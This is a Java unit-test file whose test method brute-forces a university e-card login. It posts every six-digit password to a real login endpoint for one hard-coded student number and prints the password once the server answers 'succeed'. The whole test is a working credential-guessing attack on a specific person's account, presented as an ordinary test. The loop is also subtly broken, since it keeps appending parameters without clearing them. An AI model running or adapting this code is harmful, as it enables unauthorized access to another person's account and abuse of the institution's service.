import com.alibaba.fastjson.JSONObject;
import org.junit.Test;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;
import tv.duojiao.utils.RestUtil;

import java.util.HashMap;
import java.util.Map;

/**
 * Description:
 * User: Yodes
 * Date: 2017/10/26
 */
public class TestEcard {

    RestUtil restUtil = new RestUtil();

    public static Map<String, Object> postMessage(String url, MultiValueMap paramMap, String... param) {
        HttpEntity<MultiValueMap<String, String>> request;
        MediaType type = MediaType.parseMediaType("application/x-www-form-urlencoded; charset=UTF-8");
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(type);
        headers.add("Accept", MediaType.APPLICATION_JSON.toString());
        request = new HttpEntity<MultiValueMap<String, String>>(paramMap, headers);

        ResponseEntity<String> responseEntity = new RestTemplate().postForEntity(
                url,
                request,
                String.class);
        String jsonObject = responseEntity.getBody();
//        System.out.println(jsonObject.toJSONString());
        Map<String, Object> resultMap = new HashMap<String, Object>();
        for (String p : param) {
            resultMap.put(p, jsonObject);
        }
        return resultMap;
    }

    @Test
    public void testStart() {
        String url = "http://ecard.csu.edu.cn/Handler/Operation.ashx?cmd=login&time=414";
        MultiValueMap<String, String> paramMap = new LinkedMultiValueMap<>();
        String userNo = "4302150125";
        int i = 999999;
        for (; i > 1; i--) {
            paramMap.add("loginType", "sno");
            paramMap.add("loginId", userNo);
            paramMap.add("loginPwd", String.format("%06d", i));
            if ("succeed".equals(postMessage(url, paramMap, "result").get("result"))) {
                break;
            }
        }
        System.err.println("结果为：" + userNo + "  -------  " + String.format("%06d", i));
    }
}
